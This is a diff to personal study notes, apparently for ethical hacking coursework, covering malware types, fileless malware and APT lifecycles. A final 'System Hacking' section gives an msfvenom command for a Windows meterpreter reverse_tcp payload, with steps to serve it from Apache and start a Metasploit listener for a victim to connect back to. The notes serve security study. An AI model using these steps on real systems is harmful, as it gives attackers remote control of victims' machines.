@@ -52,15 +52,19 @@ Behavioral IoCs are used to identify specific behavior related to malicious acti
 
 
 # MODULE 7: MALWARE
+
 ## Techniques used to distribute malware
     Increasingly popular method is Search Engine Optimization (SEO): This is where attackers ensure their page comes out on top of search results
 
-## Malware Components
+## Trojan Components
+
 **Crypter**: *Software that protects against reverse engineering* 
 
 **Downloader**: *Trojan that download other malware onto host*
 
-**Dropper**: *Trojan that **covertly** installs other malware in system*
+**Dropper**: *Trojan that **covertly installs** other malware in system*
+
+**Wrapper**: *Binds Trojan executable with genuine looking EXE*
 
 **Exploit**: *Exploit.**The exploit carries the payload***
 
@@ -74,13 +78,80 @@ Behavioral IoCs are used to identify specific behavior related to malicious acti
 
 **Malicious Code**: *Fundamental code that defines basic functionality of malware. May take form of Java Applets, ActiveX Controls, Browser Plugins etc*
 
+### Types of Trojans
+
+<img src='IMAGES/TrojanTypes.png'>
+
+
+## Viruses
+
+### Stages of Virus Lifecycle
+<img src='IMAGES/VirusLifecycle.png'>
+
+
+### Types of Viruses
+<img src='IMAGES/VirusTypes.png'>
+
+    Metamorphic viruses are more effective than polymorphic viruses. 
+    
+    Polymorphic viruses modify their code for each replication to avoid detection.
+
+    Metamorphic viruses are programmed to rewrite themselves completely each time they reinfect a file.
+---
+
+## Fileless Malware
+
+Malware that resides in RAM, and **executes in RAM**. Leaves no trace/detection method. Infects legitimate software and appplications via vulnerabilities.
+
+<img src='IMAGES/FilelessMalware.png'>
+
+> Type 1: EG. Receiving malicious packets that exploits vulnerability which automatically installs backdoor.
+
+> Type 2: EG. Injecting malicious PS command into WMI repo to configure filter
+
+> Type 3: Exploiting documents with embedded macro, or EXE files to inject malicious payloads into host
 
 ## Advanced Persistent Threats (APT)
 
 Generally in the system for long periods of time. Plenty of other characteristics; refer to diagram.
 
-> **APT Lifecycle**: Preparation Initial Intrusion, Expansion, Persistence, Search & Exfiltration, Cleanup
+
+
+> **APT Lifecycle**: Preparation, Initial Intrusion, Expansion, Persistence, Search & Exfiltration, Cleanup
 <img src='IMAGES/APTLifecycle.png'>
 
 
+# SYSTEM HACKING
+Writing of payloads with MSFVenom. LHOST is host (attacker) machine.
+**REMEMBER TO CHANGE PERMISSIONS WITH CHOWN/CHMOD FOR ALL FILES, EVEN APACHE**
+
+    
+    msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe
+
+Creating of *share* folder of Apache directory.
+
+    /var/www/html/share
+
+Changing of permissions for the share folder.
+
+     chown -R www-data:www-data /var/www/html/share
+
+
+Copy over the payload into the *share* folder
+
+Starting of Apache Server.
+
+    service apache2 start
+
+Enabling listener via msfconsole, use handler exploit.
+
+     use exploit/multi/handler
+
+Set the correct payload since default payload may not be correct. In this case, it is setting payload to *reverse_tcp*. 
+
+    set payload windows/meterpreter/reverse_tcp
+
+Check and set *options* such as LHOST, LPORT etc. Start exploit after to start listener.
+
+Access LHOST IP/Port in victim machine and download the payload, and execute to connect to listener.
 
